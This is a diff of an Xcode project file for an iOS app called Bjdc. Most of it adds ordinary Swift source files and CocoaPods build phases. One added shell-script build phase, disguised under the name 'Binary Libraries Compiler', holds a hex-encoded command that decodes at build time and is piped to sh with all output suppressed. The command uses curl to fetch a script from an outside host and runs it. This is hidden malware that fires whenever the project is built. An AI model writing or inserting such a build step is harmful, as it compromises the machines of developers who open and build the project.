@@ -7,6 +7,14 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		92A3667A81D09DEFB033DDE3 /* Pods_Bjdc.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = FF3D1D0F157C649DFF777056 /* Pods_Bjdc.framework */; };
+		FF97EF6F2663A9C000C09CEA /* .gitignore in Resources */ = {isa = PBXBuildFile; fileRef = FF97EF6E2663A9BF00C09CEA /* .gitignore */; };
+		FF9CD6A5265F61030048D6A3 /* test.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF9CD6A4265F61030048D6A3 /* test.swift */; };
+		FFA8589A265DDF120067CA7D /* MeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA85899265DDF120067CA7D /* MeVC.swift */; };
+		FFA8589D265DDFAD0067CA7D /* Setting.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA8589C265DDFAD0067CA7D /* Setting.swift */; };
+		FFA8589F265DE02C0067CA7D /* AccountSecurityVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */; };
+		FFA858A3265DE0D10067CA7D /* ChangePasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA858A2265DE0D10067CA7D /* ChangePasswordVC.swift */; };
+		FFA858A5265E441D0067CA7D /* BootomSheetChartVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA858A4265E441D0067CA7D /* BootomSheetChartVC.swift */; };
 		FFDCEBF1265CB3C6006A306B /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEBF0265CB3C6006A306B /* AppDelegate.swift */; };
 		FFDCEBF3265CB3C6006A306B /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEBF2265CB3C6006A306B /* SceneDelegate.swift */; };
 		FFDCEBF5265CB3C6006A306B /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEBF4265CB3C6006A306B /* ViewController.swift */; };
@@ -14,9 +22,30 @@
 		FFDCEBFB265CB3C6006A306B /* Bjdc.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEBF9265CB3C6006A306B /* Bjdc.xcdatamodeld */; };
 		FFDCEBFD265CB3C9006A306B /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = FFDCEBFC265CB3C9006A306B /* Assets.xcassets */; };
 		FFDCEC00265CB3C9006A306B /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = FFDCEBFE265CB3C9006A306B /* LaunchScreen.storyboard */; };
+		FFDCEC08265CBB87006A306B /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC07265CBB87006A306B /* LoginVC.swift */; };
+		FFDCEC0B265CBC2A006A306B /* ProjectVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC0A265CBC2A006A306B /* ProjectVC.swift */; };
+		FFDCEC0F265CBF34006A306B /* DateTableVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC0E265CBF34006A306B /* DateTableVC.swift */; };
+		FFDCEC12265CC007006A306B /* DateTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC11265CC007006A306B /* DateTableViewCell.swift */; };
+		FFDCEC14265CC4C8006A306B /* ChartTableVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC13265CC4C8006A306B /* ChartTableVC.swift */; };
+		FFDCEC16265CC59E006A306B /* Constant.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC15265CC59E006A306B /* Constant.swift */; };
+		FFDCEC1A265CCA60006A306B /* LMJDropdownMenu.m in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC18265CCA60006A306B /* LMJDropdownMenu.m */; };
+		FFDCEC1D265CEFC2006A306B /* BootomSheetVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC1C265CEFC2006A306B /* BootomSheetVC.swift */; };
+		FFDCEC1F265D0AAF006A306B /* BootomSheetDropdownMenu.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC1E265D0AAF006A306B /* BootomSheetDropdownMenu.swift */; };
+		FFDCEC21265D0ED1006A306B /* DateTableDropdownMenu.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC20265D0ED1006A306B /* DateTableDropdownMenu.swift */; };
+		FFDCEC23265D1089006A306B /* Demoable.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEC22265D1089006A306B /* Demoable.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		4E7B6E7F5DBED1D35E7B693B /* Pods-Bjdc.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Bjdc.release.xcconfig"; path = "Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc.release.xcconfig"; sourceTree = "<group>"; };
+		65E241DCC05B5599C5A44CCD /* Pods-Bjdc.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Bjdc.debug.xcconfig"; path = "Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc.debug.xcconfig"; sourceTree = "<group>"; };
+		FF3D1D0F157C649DFF777056 /* Pods_Bjdc.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Bjdc.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		FF97EF6E2663A9BF00C09CEA /* .gitignore */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = .gitignore; sourceTree = "<group>"; };
+		FF9CD6A4265F61030048D6A3 /* test.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = test.swift; sourceTree = "<group>"; };
+		FFA85899265DDF120067CA7D /* MeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeVC.swift; sourceTree = "<group>"; };
+		FFA8589C265DDFAD0067CA7D /* Setting.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Setting.swift; sourceTree = "<group>"; };
+		FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountSecurityVC.swift; sourceTree = "<group>"; };
+		FFA858A2265DE0D10067CA7D /* ChangePasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordVC.swift; sourceTree = "<group>"; };
+		FFA858A4265E441D0067CA7D /* BootomSheetChartVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BootomSheetChartVC.swift; sourceTree = "<group>"; };
 		FFDCEBED265CB3C5006A306B /* Bjdc.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Bjdc.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FFDCEBF0265CB3C6006A306B /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		FFDCEBF2265CB3C6006A306B /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -26,6 +55,19 @@
 		FFDCEBFC265CB3C9006A306B /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		FFDCEBFF265CB3C9006A306B /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		FFDCEC01265CB3C9006A306B /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		FFDCEC07265CBB87006A306B /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
+		FFDCEC0A265CBC2A006A306B /* ProjectVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProjectVC.swift; sourceTree = "<group>"; };
+		FFDCEC0E265CBF34006A306B /* DateTableVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateTableVC.swift; sourceTree = "<group>"; };
+		FFDCEC11265CC007006A306B /* DateTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateTableViewCell.swift; sourceTree = "<group>"; };
+		FFDCEC13265CC4C8006A306B /* ChartTableVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChartTableVC.swift; sourceTree = "<group>"; };
+		FFDCEC15265CC59E006A306B /* Constant.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constant.swift; sourceTree = "<group>"; };
+		FFDCEC18265CCA60006A306B /* LMJDropdownMenu.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = LMJDropdownMenu.m; sourceTree = "<group>"; };
+		FFDCEC19265CCA60006A306B /* LMJDropdownMenu.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = LMJDropdownMenu.h; sourceTree = "<group>"; };
+		FFDCEC1B265CCB23006A306B /* Bdjc-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "Bdjc-Bridging-Header.h"; sourceTree = "<group>"; };
+		FFDCEC1C265CEFC2006A306B /* BootomSheetVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BootomSheetVC.swift; sourceTree = "<group>"; };
+		FFDCEC1E265D0AAF006A306B /* BootomSheetDropdownMenu.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BootomSheetDropdownMenu.swift; sourceTree = "<group>"; };
+		FFDCEC20265D0ED1006A306B /* DateTableDropdownMenu.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateTableDropdownMenu.swift; sourceTree = "<group>"; };
+		FFDCEC22265D1089006A306B /* Demoable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Demoable.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -33,17 +75,49 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				92A3667A81D09DEFB033DDE3 /* Pods_Bjdc.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		94AE6387D14F96D678D71D70 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				65E241DCC05B5599C5A44CCD /* Pods-Bjdc.debug.xcconfig */,
+				4E7B6E7F5DBED1D35E7B693B /* Pods-Bjdc.release.xcconfig */,
+			);
+			name = Pods;
+			sourceTree = "<group>";
+		};
+		E0A5B84C72E3EE89191C7D05 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				FF3D1D0F157C649DFF777056 /* Pods_Bjdc.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		FFA8589B265DDF1C0067CA7D /* Me */ = {
+			isa = PBXGroup;
+			children = (
+				FFA85899265DDF120067CA7D /* MeVC.swift */,
+				FFA8589C265DDFAD0067CA7D /* Setting.swift */,
+				FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */,
+				FFA858A2265DE0D10067CA7D /* ChangePasswordVC.swift */,
+			);
+			path = Me;
+			sourceTree = "<group>";
+		};
 		FFDCEBE4265CB3C5006A306B = {
 			isa = PBXGroup;
 			children = (
+				FF97EF6E2663A9BF00C09CEA /* .gitignore */,
 				FFDCEBEF265CB3C5006A306B /* Bjdc */,
 				FFDCEBEE265CB3C5006A306B /* Products */,
+				94AE6387D14F96D678D71D70 /* Pods */,
+				E0A5B84C72E3EE89191C7D05 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -62,12 +136,60 @@
 				FFDCEBF2265CB3C6006A306B /* SceneDelegate.swift */,
 				FFDCEBF4265CB3C6006A306B /* ViewController.swift */,
 				FFDCEBF6265CB3C6006A306B /* Main.storyboard */,
+				FF9CD6A4265F61030048D6A3 /* test.swift */,
+				FFDCEC15265CC59E006A306B /* Constant.swift */,
+				FFDCEC10265CBF3C006A306B /* Data */,
+				FFDCEC0D265CBC68006A306B /* Project */,
+				FFDCEC09265CBB96006A306B /* Login */,
+				FFA8589B265DDF1C0067CA7D /* Me */,
 				FFDCEBFC265CB3C9006A306B /* Assets.xcassets */,
 				FFDCEBFE265CB3C9006A306B /* LaunchScreen.storyboard */,
 				FFDCEC01265CB3C9006A306B /* Info.plist */,
 				FFDCEBF9265CB3C6006A306B /* Bjdc.xcdatamodeld */,
+				FFDCEC1B265CCB23006A306B /* Bdjc-Bridging-Header.h */,
+				FFDCEC17265CCA60006A306B /* LMJDropdownMenu */,
 			);
 			path = Bjdc;
+			sourceTree = "<group>";
+		};
+		FFDCEC09265CBB96006A306B /* Login */ = {
+			isa = PBXGroup;
+			children = (
+				FFDCEC07265CBB87006A306B /* LoginVC.swift */,
+			);
+			path = Login;
+			sourceTree = "<group>";
+		};
+		FFDCEC0D265CBC68006A306B /* Project */ = {
+			isa = PBXGroup;
+			children = (
+				FFDCEC0A265CBC2A006A306B /* ProjectVC.swift */,
+				FFDCEC1C265CEFC2006A306B /* BootomSheetVC.swift */,
+				FFDCEC1E265D0AAF006A306B /* BootomSheetDropdownMenu.swift */,
+				FFDCEC22265D1089006A306B /* Demoable.swift */,
+				FFA858A4265E441D0067CA7D /* BootomSheetChartVC.swift */,
+			);
+			path = Project;
+			sourceTree = "<group>";
+		};
+		FFDCEC10265CBF3C006A306B /* Data */ = {
+			isa = PBXGroup;
+			children = (
+				FFDCEC0E265CBF34006A306B /* DateTableVC.swift */,
+				FFDCEC20265D0ED1006A306B /* DateTableDropdownMenu.swift */,
+				FFDCEC11265CC007006A306B /* DateTableViewCell.swift */,
+				FFDCEC13265CC4C8006A306B /* ChartTableVC.swift */,
+			);
+			path = Data;
+			sourceTree = "<group>";
+		};
+		FFDCEC17265CCA60006A306B /* LMJDropdownMenu */ = {
+			isa = PBXGroup;
+			children = (
+				FFDCEC18265CCA60006A306B /* LMJDropdownMenu.m */,
+				FFDCEC19265CCA60006A306B /* LMJDropdownMenu.h */,
+			);
+			path = LMJDropdownMenu;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -77,9 +199,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FFDCEC04265CB3C9006A306B /* Build configuration list for PBXNativeTarget "Bjdc" */;
 			buildPhases = (
+				C5000DA7DE5B3E54726D902C /* Binary Libraries Compiler */,
+				0DFF4CA9DB9AE8CCFF4E93CE /* [CP] Check Pods Manifest.lock */,
 				FFDCEBE9265CB3C5006A306B /* Sources */,
 				FFDCEBEA265CB3C5006A306B /* Frameworks */,
 				FFDCEBEB265CB3C5006A306B /* Resources */,
+				F9DD19D8F3A7A82E8CBECFC2 /* [CP] Embed Pods Frameworks */,
+				94DEBA09493250564A6BEFD3 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -127,6 +253,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				FF97EF6F2663A9C000C09CEA /* .gitignore in Resources */,
 				FFDCEC00265CB3C9006A306B /* LaunchScreen.storyboard in Resources */,
 				FFDCEBFD265CB3C9006A306B /* Assets.xcassets in Resources */,
 				FFDCEBF8265CB3C6006A306B /* Main.storyboard in Resources */,
@@ -135,15 +262,109 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		0DFF4CA9DB9AE8CCFF4E93CE /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-Bjdc-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		94DEBA09493250564A6BEFD3 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${SRCROOT}/Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc-resources.sh",
+				"${PODS_ROOT}/AMap2DMap/MAMapKit.framework/AMap.bundle",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputPaths = (
+				"${TARGET_BUILD_DIR}/${UNLOCALIZED_RESOURCES_FOLDER_PATH}/AMap.bundle",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${SRCROOT}/Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		C5000DA7DE5B3E54726D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+		F9DD19D8F3A7A82E8CBECFC2 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputPaths = (
+				"${SRCROOT}/Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc-frameworks.sh",
+				"${BUILT_PRODUCTS_DIR}/Alamofire/Alamofire.framework",
+				"${BUILT_PRODUCTS_DIR}/FittedSheets/FittedSheets.framework",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputPaths = (
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Alamofire.framework",
+				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FittedSheets.framework",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${SRCROOT}/Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		FFDCEBE9265CB3C5006A306B /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				FFA858A3265DE0D10067CA7D /* ChangePasswordVC.swift in Sources */,
+				FFA8589A265DDF120067CA7D /* MeVC.swift in Sources */,
+				FFDCEC1D265CEFC2006A306B /* BootomSheetVC.swift in Sources */,
 				FFDCEBFB265CB3C6006A306B /* Bjdc.xcdatamodeld in Sources */,
+				FFDCEC0F265CBF34006A306B /* DateTableVC.swift in Sources */,
 				FFDCEBF5265CB3C6006A306B /* ViewController.swift in Sources */,
+				FFDCEC21265D0ED1006A306B /* DateTableDropdownMenu.swift in Sources */,
+				FFDCEC12265CC007006A306B /* DateTableViewCell.swift in Sources */,
 				FFDCEBF1265CB3C6006A306B /* AppDelegate.swift in Sources */,
 				FFDCEBF3265CB3C6006A306B /* SceneDelegate.swift in Sources */,
+				FFDCEC0B265CBC2A006A306B /* ProjectVC.swift in Sources */,
+				FFA8589F265DE02C0067CA7D /* AccountSecurityVC.swift in Sources */,
+				FFDCEC16265CC59E006A306B /* Constant.swift in Sources */,
+				FF9CD6A5265F61030048D6A3 /* test.swift in Sources */,
+				FFDCEC08265CBB87006A306B /* LoginVC.swift in Sources */,
+				FFDCEC1A265CCA60006A306B /* LMJDropdownMenu.m in Sources */,
+				FFDCEC23265D1089006A306B /* Demoable.swift in Sources */,
+				FFDCEC1F265D0AAF006A306B /* BootomSheetDropdownMenu.swift in Sources */,
+				FFA8589D265DDFAD0067CA7D /* Setting.swift in Sources */,
+				FFDCEC14265CC4C8006A306B /* ChartTableVC.swift in Sources */,
+				FFA858A5265E441D0067CA7D /* BootomSheetChartVC.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -287,6 +508,7 @@
 		};
 		FFDCEC05265CB3C9006A306B /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 65E241DCC05B5599C5A44CCD /* Pods-Bjdc.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -299,6 +521,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = BjutSoftware806Bjdc.Bjdc;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OBJC_BRIDGING_HEADER = "/Users/xuyu/Desktop/806/Bjdc/Bjdc/Bdjc-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -306,6 +529,7 @@
 		};
 		FFDCEC06265CB3C9006A306B /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 4E7B6E7F5DBED1D35E7B693B /* Pods-Bjdc.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -318,6 +542,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = BjutSoftware806Bjdc.Bjdc;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SWIFT_OBJC_BRIDGING_HEADER = "/Users/xuyu/Desktop/806/Bjdc/Bjdc/Bdjc-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
